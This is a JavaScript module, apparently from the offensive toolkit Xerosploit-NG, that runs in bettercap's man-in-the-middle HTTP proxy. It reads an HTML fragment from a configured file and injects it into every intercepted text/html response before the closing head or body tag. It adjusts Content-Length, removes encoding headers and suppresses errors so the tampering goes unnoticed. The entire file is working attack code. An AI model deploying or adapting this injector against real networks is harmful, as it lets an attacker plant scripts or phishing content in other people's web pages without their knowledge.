// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- InjectHtml
//
// Injects the contents of the file referenced by the generated global
// XE_TARGET_FILE into every proxied text/html response, immediately before
// </head> (with a </body> / end-of-document fallback).
//
// Ported from the bettercap v1 Ruby proxy module:
//   lib/bettercap/proxy/http/modules/injecthtml.rb   (GPLv3)
// which did exactly `response.body.sub!('</head>') { "<data><p></p></head>" }`.
// Backs the "Inject Html" menu entry of Xerosploit.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_TARGET_FILE  absolute path of the HTML fragment to inject.
//
// Strict passthrough: anything that is not text/html is left untouched, and
// any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "injecthtml";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

// Number of UTF-8 bytes in a string (Content-Length is byte based).
function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

// Insert `snippet` right before </head>, else before </body>, else append.
function xeInjectBeforeCloseTag(body, snippet) {
    var lower = body.toLowerCase();
    var at = lower.indexOf("</head>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    at = lower.indexOf("</body>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    return body + snippet;
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

function onLoad() {
    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    xeLog("loaded (target file: " + target + ")");
}

function onResponse(req, res) {
    try {
        if (!xeIsHtml(res)) { return; }                                  // strict passthrough

        var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
        if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }

        var payload = xeReadFile(target);
        if (payload === null || payload === "") { xeWarn("empty target file: " + target); return; }

        var body = xeReadBody(res);
        if (typeof body !== "string" || body.length === 0) { return; }

        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
        xeLog("injecting " + target + " into " + where);

        xeSetBody(res, xeInjectBeforeCloseTag(body, payload));
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
